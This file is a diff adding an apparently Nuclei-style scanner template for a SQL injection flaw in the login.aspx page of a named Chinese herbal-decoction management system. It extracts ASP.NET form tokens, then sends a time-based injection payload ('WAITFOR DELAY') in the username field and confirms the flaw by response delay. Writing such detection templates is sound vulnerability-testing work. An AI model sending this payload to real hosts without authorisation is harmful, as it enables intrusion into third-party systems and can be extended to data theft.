@@ -1,0 +1,64 @@
+id: poc-yaml-donghuayuan-dms-login-aspx-sqli
+info:
+  name: 东华原煎药管理系统 login.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template identifies SQL injection vulnerability on the login.aspx page of 东华原煎药管理系统.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /login.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: viewstate
+        group: 1
+        internal: true
+        regex:
+          - "id=\"__VIEWSTATE\" value=\"(.*?)\""
+      - type: regex
+        name: viewstategenerator
+        group: 1
+        internal: true
+        regex:
+          - "id=\"__VIEWSTATEGENERATOR\" value=\"(.*?)\""
+      - type: regex
+        name: eventvalidation
+        group: 1
+        internal: true
+        regex:
+          - "id=\"__EVENTVALIDATION\" value=\"(.*?)\""
+
+    matchers:
+      - type: word
+        words:
+          - "北京东华原煎药管理系统"
+        part: body
+
+  - raw:
+      - |
+        POST /login.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        __VIEWSTATE={{viewstate}}&__VIEWSTATEGENERATOR={{viewstategenerator}}&__EVENTVALIDATION={{eventvalidation}}&txtUserName=';WAITFOR+DELAY+'0:0:{{t1}}'--&txtUserPwd=%27&btnLogin=%E7%99%BB%E5%BD%95
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "不存在该用户工号"
+        part: body
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'duration > to_number(t1)'
+          - 'duration < to_number(t2)'
